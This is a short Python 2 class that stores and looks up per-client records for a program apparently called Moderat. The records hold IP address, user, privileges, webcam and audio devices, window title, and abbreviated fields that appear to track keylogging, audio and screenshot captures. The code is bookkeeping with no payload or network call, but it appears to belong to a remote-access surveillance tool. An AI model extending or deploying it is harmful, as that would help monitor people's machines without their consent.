


class Clients:

    def __init__(self, moderat):
        self.moderat = moderat

    def store_clients(self, clients):
        for client in clients.keys():
            if clients[client]['status']:
                self.moderat.clients[client] = {
                    'ip_address':   clients[client]['ip_address'],
                    'alias':        clients[client]['alias'],
                    'key':          clients[client]['key'],
                    'os':           clients[client]['os'],
                    'user':         clients[client]['user'],
                    'privs':        clients[client]['privileges'],
                    'audio':        clients[client]['audio_device'],
                    'camera':       clients[client]['webcamera_device'],
                    'title':        clients[client]['window_title'],
                    'status':       clients[client]['status'],
                    'kts':          clients[client]['kts'],
                    'kt':           clients[client]['kt'],
                    'ats':          clients[client]['ats'],
                    'at':           clients[client]['at'],
                    'sts':          clients[client]['sts'],
                    'std':          clients[client]['std'],
                    'st':           clients[client]['st'],
                }
            else:
                self.moderat.clients[client] = {
                    'ip_address':   clients[client]['ip_address'],
                    'alias':        clients[client]['alias'],
                    'key':          clients[client]['key'],
                }

    def get_client(self, client):
        if self.moderat.clients.has_key(client):
            return self.moderat.clients[client]
        else:
            return False